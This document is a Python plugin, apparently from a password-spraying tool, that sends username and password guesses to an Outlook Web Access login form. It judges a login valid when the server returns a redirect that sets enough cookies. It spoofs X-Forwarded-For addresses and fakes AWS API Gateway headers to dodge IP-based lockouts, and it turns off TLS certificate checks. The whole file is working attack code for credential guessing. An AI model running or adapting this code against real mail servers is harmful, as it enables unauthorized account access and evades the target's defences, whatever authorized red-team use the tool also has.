import requests
from requests_ntlm import HttpNtlmAuth
import utils.utils as utils
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)


def owa_authenticate(url, username, password, useragent, pluginargs):

    data_response = {
        'result' : None,    # Can be "success", "failure" or "potential"
        'error': False,
        'output' : "",
        'valid_user' : False
    }

    spoofed_ip = utils.generate_ip()
    amazon_id = utils.generate_id()
    trace_id = utils.generate_trace_id()

    headers = {
        'User-Agent' : useragent,
        "X-My-X-Forwarded-For" : spoofed_ip,
        "x-amzn-apigateway-api-id" : amazon_id,
        "X-My-X-Amzn-Trace-Id" : trace_id,
    }

    headers = utils.add_custom_headers(pluginargs, headers)


    ''' from sprayowa '''
    """
    Check id credentials are valid against the target server
    :return: number of cookies set by server or 0. In case of successfull login, number of cookies will be > 1 !
    """
    if not('\\' in username) and not('@' in username):
        username = pluginargs['domain'] + "\\" + username

    owa_url = (pluginargs['owa']).split('.com')[1]
    server_url = pluginargs['url'] + owa_url

    payload = {'destination': server_url,
               'flags': 4,
               'forcedownlevel': 0,
               'username': username,
               'password': password,
               'passwordText': '',
               'isUtf8': 1}

    try:

        resp = requests.post(url + owa_url, data=payload, headers=headers, verify=False, allow_redirects=False)
        num_cookies = 4

        if resp.status_code == 302:
            cookies = resp.cookies
            cookie_num = len(cookies)
            if cookie_num >= num_cookies:
                data_response['output'] = f"[+] SUCCESS: Found credentials: {username}:{password}"
                data_response['result'] = "success"
                data_response['valid_user'] = True
            else:
                data_response['output'] = f"[-] FAILURE: Invalid credentials: {username}:{password}"
                data_response['result'] = "failure"
        else:
            data_response['output'] = f"[-] FAILURE: Invalid credentials: {username}:{password}"
            data_response['result'] = "failure"


    except Exception as ex:
        data_response['error'] = True
        data_response['output'] = ex
        pass

    return data_response
